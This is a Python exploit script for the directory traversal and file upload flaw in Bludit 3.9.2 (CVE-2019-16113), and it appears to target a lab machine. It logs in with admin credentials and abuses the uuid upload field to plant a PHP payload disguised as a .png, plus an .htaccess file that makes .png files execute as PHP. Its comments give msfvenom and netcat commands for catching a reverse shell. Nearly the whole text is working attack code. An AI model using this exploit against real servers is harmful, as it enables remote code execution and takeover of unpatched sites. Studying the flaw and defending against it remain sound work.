# Title: Bludit 3.9.2 - Directory Traversal
# Author: James Green
# Date: 2020-07-20
# Vendor Homepage: https://www.bludit.com
# Software Link: https://github.com/bludit/bludit
# Version: 3.9.2
# Tested on: Linux Ubuntu 19.10 Eoan
# CVE: CVE-2019-16113
# 
# Special Thanks to Ali Faraj (@InfoSecAli) and authors of MSF Module https://www.exploit-db.com/exploits/47699

#### USAGE ####
# 1. Create payloads: .png with PHP payload and the .htaccess to treat .pngs like PHP
# 2. Change hardcoded values: URL is your target webapp, username and password is admin creds to get to the admin dir
# 3. Run the exploit
# 4. Start a listener to match your payload: `nc -nlvp 53`, meterpreter multi handler, etc
# 5. Visit your target web app and open the evil picture: visit url + /bl-content/tmp/temp/evil.png

#!/usr/bin/env python3

import requests
import re
import argparse
import random
import string
import base64
from requests.exceptions import Timeout

url = 'http://blunder.htb'  # CHANGE ME
username = 'fergus'  # CHANGE ME
password = 'RolandDeschain'  # CHANGE ME

# msfvenom -p php/reverse_php LHOST=127.0.0.1 LPORT=53 -f raw -b '"' > evil.png
# echo -e "<?php $(cat evil.png)" > evil.png 
payload = 'evil.png'  # CREATE ME

# echo "RewriteEngine off" > .htaccess
# echo "AddType application/x-httpd-php .png" >> .htaccess
payload2 = '.htaccess'  # CREATE ME

def login(url,username,password):
    """ Log in with provided admin creds, grab the cookie once authenticated """

    session = requests.Session()
    login_page = session.get(url + "/admin/")
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"',
                           login_page.text
                 ).group(1)
    cookie = ((login_page.headers["Set-Cookie"]).split(";")[0].split("=")[1])
    data = {"save":"",
            "password":password,
            "tokenCSRF":csrf_token,
            "username":username}
    headers = {"Origin":url,
               "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Upgrade-Insecure-Requests":"1",
               "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Connection":"close",
               "Referer": url + "/admin/",
               "Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding":"gzip, deflate",
               "Content-Type":"application/x-www-form-urlencoded"
    }
    cookies = {"BLUDIT-KEY":cookie}
    response = session.post(url + "/admin/",
                            data=data,
                            headers=headers,
                            cookies=cookies,
                            allow_redirects = False
               )

    print("cookie: " + cookie)
    return cookie

def get_csrf_token(url,cookie):
    """ Grab the CSRF token from an authed session """

    session = requests.Session()
    headers = {"Origin":url,
               "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Upgrade-Insecure-Requests":"1",
               "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Connection":"close",
               "Referer":url + "/admin/",
               "Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding":"gzip, deflate"}
    cookies = {"BLUDIT-KEY":cookie}
    response = session.get(url + "/admin/dashboard",
                           headers=headers,
                           cookies=cookies
               )
    csrf_token = response.text.split('var tokenCSRF = "')[1].split('"')[0]

    print("csrf_token: " + csrf_token)
    return csrf_token

def upload_evil_image(url, cookie, csrf_token, payload, override_uuid=False):
    """ Upload files required for to execute PHP from malicious image files. Payload and .htaccess """

    session = requests.Session()
    files= {"images[]": (payload,
                         open(payload, "rb"),
                         "multipart/form-data",
                         {"Content-Type": "image/png", "filename":payload}
                        )}
    if override_uuid:
        data = {"uuid": "../../tmp/temp",
                "tokenCSRF":csrf_token}
    else:
        # On the vuln app, this line occurs first:
        # Filesystem::mv($_FILES['images']['tmp_name'][$uuid], PATH_TMP.$filename);
        # Even though there is a file extension check, it won't really stop us
        # from uploading the .htaccess file.
        data = {"tokenCSRF":csrf_token}
    headers = {"Origin":url,
               "Accept":"*/*",
               "X-Requested-With":"XMLHttpRequest",
               "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Connection":"close",
               "Referer":url + "/admin/new-content",
               "Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding":"gzip, deflate",
    }
    cookies = {"BLUDIT-KEY":cookie}
    response = session.post(url + "/admin/ajax/upload-images", data=data, files=files, headers=headers, cookies=cookies)
    print("Uploading payload: " + payload)

if __name__ == "__main__":
    cookie = login(url, username, password)
    token = get_csrf_token(url, cookie)
    upload_evil_image(url, cookie, token, payload, True)
    upload_evil_image(url, cookie, token, payload2)
